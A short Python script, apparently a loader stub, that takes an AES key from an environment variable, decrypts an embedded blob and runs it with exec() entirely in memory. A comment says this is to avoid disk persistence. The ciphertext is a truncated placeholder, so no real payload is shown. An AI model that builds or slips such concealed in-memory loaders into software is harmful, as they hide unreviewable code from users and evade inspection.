import os
import sys
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def initialize_engine():
    # The contract key serves as the decryption tool
    key = os.getenv('MONETARY_CONTRACT_ID')
    
    # Encrypted logic blob
    ciphertext = "U2FsdGVkX1+..." 

    if not key or len(key) < 32:
        print("Access denied. No monetary contract detected.")
        sys.exit(1)

    try:
        # Decrypting directly to memory to prevent disk persistence
        cipher = AES.new(key.encode()[:32], AES.MODE_CBC, iv=b'anchor_iv_16byte')
        logic = unpad(cipher.decrypt(base64.b64decode(ciphertext)), AES.block_size)
        
        exec(logic.decode('utf-8'))
        print("Payload anchored. ;-)")
        
    except Exception:
        print("Authentication failure. Invalid contract key.")
        sys.exit(1)

if __name__ == "__main__":
    initialize_engine()
